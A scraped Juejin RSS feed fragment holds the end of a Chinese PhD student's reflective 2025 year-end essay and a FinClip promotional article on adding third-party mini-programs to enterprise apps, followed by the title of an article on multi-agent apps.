                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>岁末的钟声在寒夜里回荡，显示器的微光在满屏的公式与代码间明明灭灭。于我而言，这些文字，是时间风尘的证词，是对消失的、存在的事物的祭奠，是对卑微之物的重新打量。逝水流远，长忆当歌，这些文字献予过往与当下，献予消失的、到来的无尽命运和岁月。</p>
<p>终于，2025年过去了。</p>
<h2 data-id="heading-0">这一年我读了一些书</h2>
<blockquote>
<p>我是天上清风仙，阅览群书在人间</p>
</blockquote>
<p>深夜的实验室里，文献与代码在屏幕上交替闪现，仿佛两个平行世界的对话。今年重读李娟的《遥远的向日葵》，在阿尔泰的荒原叙事中找到了某种深刻的共鸣。她笔下那些在碱土中挣扎的向日葵，从不像梵高画作中那样燃烧着生命的狂热，也不追求成为耀眼的太阳图腾，只是固执地在贫瘠中完成着属于自己的轮回。这种在荒凉中依然保持尊严的姿态，让我想起实验室窗外那些在砖缝间顽强生长的野草，它们不需要任何人的注目，只是在无人问津的角落里，按照自己的节奏完成生命的旅程。</p>
<p>这种朴素的生命哲学，恰与存在主义的核心洞见不谋而合。世界本质上是荒诞的，人生或许真的没有预设的意义，就像推石上山的西西弗，他的劳作看似是无意义的重复。但加缪告诉我们，重要的不是石头会不会再次滚落，而是在这个看似徒劳的过程中，我们依然保有说"是"的勇气。当西西弗意识到荒诞的存在，却依然选择推石上山时，他就已经战胜了命运。这种觉悟，让他在每一次下山的路上都能以轻盈的脚步，直面生命的重量。</p>
<p>成功从来不是以完美的结局来定义的，存在本身就是一种英雄主义。这种英雄主义就体现在绝境中的自由选择——就像李娟笔下那些在盐碱地里依然努力生长的向日葵，它们的选择不是成为别人眼中的风景，而是在最贫瘠的土壤里守住生命的本真。这让我想起科研路上的日日夜夜，那些看似毫无进展的实验，那些反复调试的代码，何尝不像是另一种形式的"推石上山"？我们选择继续，不是因为确信一定能抵达山顶，而是因为在推石的过程中，我们找到了属于自己的节奏和意义。</p>
<p>真正的智慧，或许就藏在这种日复一日的坚持里。就像荒原上的向日葵，它们从不问为什么要生长，只是专注地完成每一次日出日落的轮回。在这个过程中，它们不仅抵御了荒原的贫瘠，更在碱土中开出了独一无二的花朵。这或许就是存在主义最深刻的启示：生命的意义不在远方，就在每一次推石上山的路上，在每一个看似平凡却充满勇气的选择里。</p>
<h2 data-id="heading-1">这一年发生的事</h2>
<blockquote>
<p>世事如潮，推石如常。大处的风声，终究要落到每个人案头那盏灯的明灭里。</p>
</blockquote>
<p>如果说书给人的安慰，是一种温柔的解释；那么现实给人的教育，往往更像粗粝的证据：它不急着说服谁，只是在反复的推移与撞击中，让人看清自己站在哪里，又能走到哪里。</p>
<p>这一年，世界依旧在几条永恒的张力线上摆荡：战争与和平、秩序与撕裂、繁荣与匮乏、技术与不安。许多事情并非“发生”那么简单，它们更像缓慢移动的大陆板块——平日里几乎无感，直到某一次摩擦发出巨响，才意识到其实一直生活在震动之上。人们仍然用更短的耐心追逐更快的变化，用更碎的情绪解释更复杂的结构；而宏大叙事并不会自动给个人答案，答案往往藏在更具体、更笨拙的生活与劳动里。</p>
<p>物理学中有个定律，庞加莱回归：对于在有限体积内运动的、由大量粒子组成的守恒力学系统，经过足够漫长的时间后，系统会无限接近其初始状态。它讲的是理想封闭系统的必然，却也提供一种近乎残酷的隐喻——许多以为已经被时代“解决”的矛盾，常会在另一种形式里再度归来。人类社会当然不是孤立系统，变量持续注入，回归并不等于原样重演；但张力反复出现的事实，足以让人对“进步的直线叙事”保持节制。</p>
<p>在技术的浪潮中，这一年尤为显著的是一种“从新奇到常态”的转变。人工智能不再只是新闻标题里的惊叹号，而正在成为基础设施、生产关系与认知方式的一部分：它让效率更锋利，也让不确定更普遍；它把很多人的工作往前推了一步，也把很多人的焦虑往下压了一层。与此同时，人类对技术的态度出现微妙分裂：有人把它当作捷径，有人把它当作威胁；有人沉迷于“替代”，有人执拗于“不可替代”。在实验室的漫长夜里，反倒更容易相信后一种判断——真正能抵御无序的，从来不是工具本身，而是使用工具的人，是否仍愿意对真问题保持耐心，对好答案保持诚实。</p>
<p>这些“时代的大事”落在身上，并不总以新闻的形式呈现，而是以更细小的方式嵌入日常：算力的紧张与预算的权衡、数据的噪声与偏差、评审的标准与门槛、代码的边界条件与不可复现。它们像一圈圈看不见的绳索，勒住研究者的想象力，也逼迫人学会更务实地创造负熵：少一点空想，多一点验证；少一点宏愿，多一点可落地的路径。</p>
<p>而这一年的巨响之一，仍来自俄乌战争。漫长的拉锯让“和平”越来越像谈判桌上的语法：停火、边界、安全、承诺与背书，被反复抬起，又反复搁置。更令人心寒的并非战火本身，而是战火之外的计算——当强权习惯性地无视公平正义，原则便容易沦为装饰，命运则被折算为筹码。普京式的强硬与特朗普式的交易，恰是这种冷硬现实的两个侧影：一个把既成事实推成规则，一个把规则降格为条件。</p>
<p>同一年里，杨振宁先生的离去也像一道静默的分界线。他的一生，既是科学史的一部分，也是时代结构的一部分：选择赴美，置身科学中心，当然成就了他的高度；但同样的时代分岔，也让许多同样优秀的人落寞——不是因为不够好，而是因为机会从来不按才华的密度均匀分配。传奇的光芒越清晰，越映出那些未被照见的阴影：被耽误的天赋、被迫改写的志业、被现实消耗的锋芒。</p>
<h2 data-id="heading-2">这一年个人的学习生活</h2>
<blockquote>
<p>孤独是自由的衍生品，遗憾是往事的纪念品</p>
</blockquote>
<p>这一年，生活的推进并不迅疾。很多时候，进展像被拉长的阴影：看得见在移动，却很难说清究竟向前了多少。新的成果不多，甚至常有一种停滞的错觉；压力却并不因此减少，反而在时间的逼近里变得更具体、更有重量。博三将尽，博四在即，才忽然意识到一年竟已走完——时间从不解释自己，只是把人轻轻往前推，推到不得不面对的节点上。</p>
<p>在这样的年份里，情绪也更容易被细小的事牵动：一次实验的失败，一次会议的追问，一次深夜的自我复盘，都足以让人短暂失衡。可同样是在这些不稳定里，仍有一些东西悄悄保留下来——像在漫长的日子里曾被认真地照亮过。那种照亮并不喧哗，更像冬夜里一盏不刺眼的灯，让人在疲惫与不确定中仍愿意把生活过下去；也像某些时刻递来的沉默理解，使人相信自身并非全然孤立的存在。</p>
<p>只是，人间的温柔常带着期限。并非不曾真诚，也并非不曾用力，而是一些更复杂的缘由——路径的分岔、节奏的错位、现实的牵制——让许多未竟之事最终选择停在合适的位置。它们不一定需要一个明确的结尾，更像把某段路轻轻折起，收进记忆的夹层里：不再铺陈，却也不必抹去。</p>
<p>于是，孤独并不全是失去，它也意味着把自由重新领回手中；遗憾也不尽是缺憾，它更像往事留下的纪念品，提醒人曾经拥有过、也曾经珍惜过。</p>
<h2 data-id="heading-3">这一年的感悟</h2>
<blockquote>
<p>鸷鸟之不群兮，自前世而固然</p>
</blockquote>
<p>这一年，许多苦楚并不来自惊天动地的事，而来自一些反复出现的细节：话语在转述里走样，沉默被解读成态度，迟疑被涂成罪名。这样的缝隙里并非只有一人踽踽独行——不少人都在相似的回声中耗损：被误读、被揣测、被轻慢，或在某个瞬间被迫为并不存在的“过错”自证清白。于是，事实尚未来得及站稳，流言便已先行；“道德法庭”也总能迅速搭起——不问证据，只问站位；不问复杂，只问归队。黑与白被描得锋利，并非世界天生如此，而是灰色太耗耐心：承认复杂意味着承担责任，允许暧昧意味着接受不确定，而群体最怕的，恰是这种不确定。</p>
<p>更疲惫的是，这并不总出自赤裸的恶意，更多是一种普遍的自保：用嘲弄维系秩序，用贬损确认位置，用“为你好”包装干预。环境越逼仄，资源越稀缺，竞争越紧张，这种自保越容易滑向冷硬，甚至做到无声无息——夺走的是名誉、机会、边界与安宁，却很难指出哪一刀真正落下。许多场合里，表演比真实更安全，附和比独立更省事；流行的不是诚恳，而是姿态；不是求真，而是求胜。</p>
<p>也正因如此，“不群”不再只是诗句里的修辞，它更像一条不得不走的路：把精力从无谓的争辩里抽离出来，把手伸回到仍可握住的事——读书、写作、摄影，把日子一寸寸过实。所谓节制，并非洁癖式的拒绝，而是拒绝被拖入那套轻佻的裁决里：宁可慢一些，也不把人生交给喧哗；宁可沉默，也不把解释当作乞求。</p>
<p>即将到来的，某段集体记忆将迎来一个整圆的节点。时间改变了外衣与语境，却未必改变暗河的走向：流言仍可能先于事实，立场仍可能替代判断，道德仍可能被当作工具。所谓反思，并不止于回望那段岁月如何把人卷入洪流，更在于辨认这些机制如何在日常里换形续存——当恐惧、稀缺、从众与权力诱惑再度集齐，相似的戏码便会以更温和、更日常的方式重演。</p>
<p>也因此，真正珍贵的，反倒是那些不显眼却更难的东西：在灰色里保持清明，在压力下守住边界，在看过人心之后仍不轻易变成同类。宇宙恒长，文明盛衰，唯有善良与生命证明着人类的存在和延续——那是最朴素的介质，却拥有穿越时空的力量。终将义无反顾地走进那个温和的良夜，去探索生命的春天，永不停歇。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[流量都去哪儿了？拯救APP月活，用FinClip轻松引入第三方生态]]></title>    <link>https://juejin.cn/post/7584073390694072335</link>    <guid>https://juejin.cn/post/7584073390694072335</guid>    <pubDate>2025-12-16T08:43:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584073390694072335" data-draft-id="7584043969687666740" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="流量都去哪儿了？拯救APP月活，用FinClip轻松引入第三方生态"/> <meta itemprop="keywords" content="APP"/> <meta itemprop="datePublished" content="2025-12-16T08:43:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FinClip"/> <meta itemprop="url" content="https://juejin.cn/user/395479918322696"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            流量都去哪儿了？拯救APP月活，用FinClip轻松引入第三方生态
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/395479918322696/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FinClip
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:43:58.000Z" title="Tue Dec 16 2025 08:43:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>数据显示，超过80%的App在用户下载后30天内被遗忘。而企业又苦恼于App用户留存难，获客成本越来越高。 </p>
<p>企业App可能一个月只被用户打开一两次，而用户每天在微信、支付宝里要用几十个服务。</p>
<p>为什么？ </p>
<p>因为App提供的服务太单一，用户不可能为了偶尔查个航班就留着一个航司App，也不会为了一个月叫一次保洁，就留着家政App。</p>
<p>那么，流量都去哪儿了呢？企业APP如何提高月活呢？</p>
<p><strong>引入第三方生态</strong></p>
<p><strong>把App变成“服务集合体”</strong></p>
<p>我们先看这么一组数据。</p>
<p>据《月狐数据》统计，2025年Q3移动互联网APP活跃度: 腾讯控股以 176 个应用数和 12.81 亿 MAU 位居榜首，应用生态布局最广；阿里巴巴 MAU 达 12.51 亿，与腾讯竞争激烈；抖音集团 MAU 12.39 亿且季度增长率 18.8%，增长势头强劲。美团（33.1%）、快手（24.1%）等企业也保持较高增长速率，显示出不同领域的活力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/848e3808efdf4d949129ec9dbf3c2296~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmluQ2xpcA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766479437&amp;x-signature=GKFDIahudOldSuOY5K5z9lOwr98%3D" alt="图片" loading="lazy"/></p>
<p>资料来源：《月狐数据》</p>
<p>由上图可见，应用生态布局越广的企业，它的月活越高，自然企业的效益也能持续增长。</p>
<p>比如： 航司App里加入租车、酒店、当地旅游服务；银行App里加入生活缴费、外卖优惠、影院购票；车企App里加入洗车预约、充电导航、保险服务，这样用户打开你App的理由就从每月1次变成了每天多次。 </p>
<p>如酒店App,不用自研门票系统，直接引入携程的小程序；不用自研餐饮推荐，直接引入大众点评的小程序；不用自研打车服务，直接引入滴滴的小程序，让专业的人做专业的事，你的App只需做好“平台运营”。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89ef186c95344bc4b15ee11356ed59cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmluQ2xpcA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766479437&amp;x-signature=FCHRk0qWqJxCtJjaFV2AbaQwiAI%3D" alt="图片" loading="lazy"/></p>
<p><strong>FinClip SDK，为APP引入生态护航</strong></p>
<p>有些企业尝试过H5方式引入第三方服务，结果用户反馈： 加载慢得像十年前网页，支付流程经常卡顿，界面风格让人眼花缭乱，安全性也让人担忧。</p>
<p>这是由于H5技术天然有体验天花板，且难以统一管控。</p>
<p>而通过凡泰超级应用智能平台FinClip引入的小程序，却能带来：</p>
<p>1、体验统一：所有第三方服务都有接近原生的流畅度； </p>
<p>2、安全可控：每个小程序都在安全沙箱内运行； </p>
<p>3、风格一致：可要求第三方符合你的UI规范； </p>
<p>4、数据安全：用户数据完全隔离，第三方拿不走。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8647cef4df8b4721a218d83449117b40~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmluQ2xpcA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766479437&amp;x-signature=CZD2DgKp0Zz39L7VHLtKNyipwMQ%3D" alt="图片" loading="lazy"/></p>
<p><strong>助力企业App从“产品”到“平台”</strong></p>
<p>FinClip提供了从技术到运营的完整解决方案，帮助企业App完成从单一产品到开放平台的转型。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3f9247a85184820be71086a9f915843~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmluQ2xpcA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766479437&amp;x-signature=gtag46z6LbJCjT7bWkG9P1%2BQCNA%3D" alt="图片" loading="lazy"/></p>
<p><strong>1、小程序全生命周期管理</strong></p>
<p>痛点场景：一家大型连锁酒店集团，希望在自己的App中引入当地旅游、租车、餐饮服务，但担心第三方服务质量不可控、内容审核难、更新维护复杂。 </p>
<p>解决方案：FinClip提供统一审核管控，所有第三方小程序必须通过管理后台的统一审核，确保服务质量和内容合规性；安全沙箱隔离，每个小程序在独立环境中运行，相互隔离，防止安全风险扩散；灰度发布能力，新服务可先向10%用户开放，验证效果后再全面推广；热更新支持，服务更新无需重新发布App，实现短时间迭代。 </p>
<p>应用效果：该酒店集团在3个月内引入了超过50个目的地服务小程序，用户月均打开次数从1.2次提升至8.5次，用户停留时长增长400%。</p>
<p><strong>2、多企业统一管理审核</strong></p>
<p>痛点场景：某银行希望与各地市政、公共服务机构合作，在App中提供水电气缴费、社保查询等服务，但面临不同机构技术标准不一、对接效率低等问题。 </p>
<p>解决方案：标准化接入流程，制定统一的技术标准和审核规范，第三方机构按标准开发即可快速接入；多租户管理体系：为每个合作机构提供独立管理后台，数据完全隔离；统一体验保障，所有小程序必须符合银行的UI/UX规范，确保用户体验一致性；合规性自动检测，系统自动检测小程序的隐私政策、权限申请等合规性要求。 </p>
<p>应用效果：银行在6个月内接入了全国50多个城市的公共服务，将原本需要数月的对接周期缩短至2周内，公共服务使用率占App总流量的25%。</p>
<p><strong>3、打造企业专属的小程序应用商店</strong></p>
<p>痛点场景：某汽车制造商希望将车载屏幕和手机App打通，构建智能出行生态，但缺乏应用商店的运营经验和基础设施。 </p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c9860fd5d7a4bb58bd5d55042d14222~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmluQ2xpcA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766479437&amp;x-signature=f%2B3TxwFL12iZNMCQBpZ5YwooVeI%3D" alt="图片" loading="lazy"/></p>
<p>解决方案：根据品牌调性定制商店界面，支持个性化推荐和智能搜索；提供地图、支付、AI语音等基础能力插件，降低开发者门槛；支持小程序的批量测试、审核和发布，提升运营效率。 </p>
<p>应用效果：该汽车制造商建立了行业首个车载小程序生态，吸引了超过30家服务商入驻，涵盖导航、娱乐、充电、维修等全场景服务，单辆车机的小程序月活增长32%。</p>
<p>通过FinClip引入第三方生态，不仅在用户指标上获得显著提升，也升级了商业模式。从单一的服务收入，扩展至流量分成、广告收入、数据、技术服务等多元收入，形成“服务越多-用户越多-开发者越多”的良性循环。 </p>
<p>企业App的下半场竞争，本质上是用户时间与价值的竞争。当单一服务已无法满足用户日益复杂的需求，用FinClip引入繁荣、安全、可控的小程序生态，是开启第二增长曲线的关键钥匙。</p>
<p>-- END --</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[调用多个Agent，Chatkit让APP从“单打独斗”到“团队协作”]]></title>    <link>https://juejin.cn/post/7584043969687748660</link>    <guid>https://juejin.cn/post/7584043969687748660</guid>    <pubDate>2025-12-16T08:45:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584043969687748660" data-draft-id="7584043969687699508" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="调用多个Agent，Chatkit让APP从“单打独斗”到“团队协作”"/> <meta itemprop="keywords" content="APP"/> <meta itemprop="datePublished" content="2025-12-16T08:45:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FinClip"/> <meta itemprop="url" content="https://juejin.cn/user/395479918322696"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            调用多个Agent，Chatkit让APP从“单打独斗”到“团队协作”
